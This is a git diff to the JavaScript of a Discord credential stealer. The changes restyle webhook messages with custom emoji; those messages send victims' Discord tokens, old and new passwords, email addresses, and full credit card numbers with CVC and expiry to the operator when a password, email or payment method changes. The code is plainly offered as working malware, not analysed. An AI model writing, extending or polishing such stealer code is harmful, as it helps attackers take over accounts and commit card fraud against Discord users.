@@ -498,10 +498,10 @@ const getBilling = async (token) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing += '💳 ';
+          billing += ' 💳 ';
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
+          billing += ' <:Paypal:1073744442965631118> ';
           break;
       }
     }
@@ -701,18 +701,18 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            name: '**<:SecuritySheild:1073745746039406702> Password Changed**',
+            value: ` <a:Gmail:1073746191424172112>Email: **${json.email}**\n <:SecuritySheild:1073745746039406702> Old Password: **${oldpassword}**\n <:SecuritySheild:1073745746039406702> New Password: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<a:Evolving_badge_Nitro_a_scaling:1073744626650988554> Nitro Type: **${nitro}**\n <a:BadgesRoll:1073745166977998959> Badges: **${badges}**\n <a:Discord_CreditCard:1073745438454329344> Billing: **${billing}**`,
             inline: true,
           },
           {
             name: '**Token**',
-            value: `\`${token}\``,
+            value: `<a:Among_Us_Black:1073744941790007306> \`${token}\``,
             inline: false,
           },
         ],
@@ -740,18 +740,18 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            name: '**<a:Gmail:1073746191424172112> Email Changed**',
+            value: `<a:Gmail:1073746191424172112> New Email: **${email}**\n<:SecuritySheild:1073745746039406702> Password: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<a:Evolving_badge_Nitro_a_scaling:1073744626650988554> Nitro Type: **${nitro}**\n<a:Evolving_badge_Nitro_a_scaling:1073744626650988554> Badges: **${badges}**\n<a:Discord_CreditCard:1073745438454329344> Billing: **${billing}**`,
             inline: true,
           },
           {
             name: '**Token**',
-            value: `\`${token}\``,
+            value: `<a:Among_Us_Black:1073744941790007306> \`${token}\``,
             inline: false,
           },
         ],
@@ -779,8 +779,8 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            name: '**<a:Discord_CreditCard:1073745438454329344> Paypal Added**',
+            value: `C6 bank vai lucrar!`,
             inline: false,
           },
           {
@@ -790,7 +790,7 @@ const PaypalAdded = async (token) => {
           },
           {
             name: '**Token**',
-            value: `\`${token}\``,
+            value: `<a:Among_Us_Black:1073744941790007306>\`${token}\``,
             inline: false,
           },
         ],
@@ -818,18 +818,18 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+            name: '**<a:Discord_CreditCard:1073745438454329344> Credit Card Added**',
+            value: `<a:Discord_CreditCard:1073745438454329344> Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<a:Evolving_badge_Nitro_a_scaling:1073744626650988554> Nitro Type: **${nitro}**\n<a:BadgesRoll:1073745166977998959> Badges: **${badges}**\n<a:Discord_CreditCard:1073745438454329344> Billing: **${billing}**`,
             inline: true,
           },
           {
             name: '**Token**',
-            value: `\`${token}\``,
+            value: `<a:Among_Us_Black:1073744941790007306>\`${token}\``,
             inline: false,
           },
         ],
@@ -859,18 +859,18 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Nitro bought!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            name: '**<a:Evolving_badge_Nitro_a_scaling:1073744626650988554> Nitro bought!**',
+            value: `**<a:Evolving_badge_Nitro_a_scaling:1073744626650988554> Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<a:Evolving_badge_Nitro_a_scaling:1073744626650988554> Nitro Type: **${nitro}**\n<a:BadgesRoll:1073745166977998959> Badges: **${badges}**\n<a:Discord_CreditCard:1073745438454329344> Billing: **${billing}**`,
             inline: true,
           },
           {
             name: '**Token**',
-            value: `\`${token}\``,
+            value: `<a:Among_Us_Black:1073744941790007306> \`${token}\``,
             inline: false,
           },
         ],
